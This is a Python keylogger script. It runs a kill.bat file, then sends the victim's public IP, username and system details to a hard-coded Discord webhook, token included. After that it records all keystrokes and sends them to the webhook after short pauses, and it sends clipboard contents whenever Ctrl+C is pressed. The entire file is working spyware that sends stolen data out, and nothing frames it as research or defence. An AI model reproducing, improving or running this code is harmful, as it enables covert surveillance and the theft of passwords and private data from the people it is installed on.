import os
import requests
import threading
import subprocess
import time
from pynput import keyboard
import psutil
import pyperclip

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " SPACE ",
    keyboard.Key.enter: " ENTER ",
    keyboard.Key.backspace: " BACKSPACE ",
    keyboard.Key.tab: " TAB ",
    keyboard.Key.shift: " SHIFT ",
    keyboard.Key.ctrl_l: " CTRL ",
    keyboard.Key.ctrl_r: " CTRL ",
    keyboard.Key.alt_l: " ALT ",
    keyboard.Key.alt_r: " ALT ",
    keyboard.Key.cmd: " CMD ",
    keyboard.Key.esc: " ESC ",
}

# Store keys pressed
keys_pressed = set()

username = os.getlogin()

def run_bat_file():
    """Run the kill.bat file when the script starts."""
    bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
    try:
        subprocess.run([bat_file_path], check=True)
        print(f"Successfully ran {bat_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error running {bat_file_path}: {e}")


def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"


def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")


def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""


def on_press(key):
    """Called when a key is pressed."""
    global keystrokes, last_keypress_time

    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            keys_pressed.add("ctrl")
        elif key.char == 'c' and "ctrl" in keys_pressed:
            # User pressed Ctrl+C, send clipboard content
            clipboard_content = pyperclip.paste()
            send_to_webhook(f"Clipboard content: {clipboard_content}")
            return False  # Don't propagate 'C' key to prevent logging
        elif hasattr(key, 'char') and key.char is not None:
            # Regular keypress (letters, numbers, etc.)
            key_str = key.char
            with lock:
                keystrokes += key_str
                last_keypress_time = time.time()
        elif key in special_keys:
            # Special key press
            key_str = special_keys.get(key, f"[{key}]")
            with lock:
                keystrokes += key_str
                last_keypress_time = time.time()
    except AttributeError:
        pass


def on_release(key):
    """Called when a key is released."""
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        keys_pressed.discard("ctrl")
    if key == keyboard.Key.esc:
        return False  # Stop the listener when Escape is pressed


# Run kill.bat file at the start
run_bat_file()

# Get and send public IP and username
username = os.getlogin()
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")

# Gather system information
cpu_count = psutil.cpu_count(logical=True)
cpu_percent = psutil.cpu_percent(interval=1)
memory_info = psutil.virtual_memory()
disk_info = psutil.disk_usage('/')

send_to_webhook(f"CPU cores: {cpu_count}")
send_to_webhook(f"CPU percent: {cpu_percent}%")
send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")

# Start the keystroke monitor thread
threading.Thread(target=keystroke_monitor, daemon=True).start()

# Set up the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Listener stopped.")
